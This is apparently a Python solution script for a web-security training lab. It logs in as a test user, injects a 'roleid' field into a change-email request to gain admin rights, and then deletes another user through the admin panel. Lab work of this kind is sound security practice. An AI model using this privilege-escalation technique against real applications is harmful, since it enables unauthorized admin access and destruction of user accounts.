#################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: User role can be modified in user profile
#
# Steps: 1. Login as wiener
#        2. Change the roleid of wiener
#        3. Fetch the admin panel
#        4. Delete carlos
#
#################################################################


###########
# imports
###########
import requests
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ad60013040dd73581b1521d00a10070.web-security-academy.net"

# set credentials 
data = {
    "username": "wiener",
    "password": "peter"
}

try:
    # login as wiener
    login = requests.post(f"{url}/login", data, allow_redirects=False)

except:
    print(Fore.RED + "[!] Failed to fetch /login through exception")
    exit(1)
    
# if you logged in successfully
if login.status_code == 302:
    print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
    
    # get session cookie
    session = login.cookies.get("session")

    # set session cookie
    cookies = {
        "session": session
    }
    
    # data to send via POST
    json = {
        "email": "wiener@admin.net",
        "roleid": 2
    }
        
    try:  
        # change the roleid; chaning the email is not important
        change_email = requests.post(f"{url}/my-account/change-email", cookies=cookies, json=json, allow_redirects=False)
        
    except:
        print(Fore.RED + "[!] Failed to change the email roleid through exception")
        exit(1)

    print(Fore.WHITE + "2. Changing roleid to 2.. " + Fore.GREEN + "OK")
    
    try:
        # fetch the admin panel
        # this step is not necessary in the script, you can do step 4 directrly
        # it's a must only when solving the lab using the browser
        admin_panel = requests.get(f"{url}/admin", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to fetch the admin panel through exception")
        exit(1)

    print(Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")

    try:  
        # delete carlos
        delete_carlos = requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to delete carlos through exception")
        exit(1)

    print(Fore.WHITE + "4. Deleting carlos.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to login as wiener")

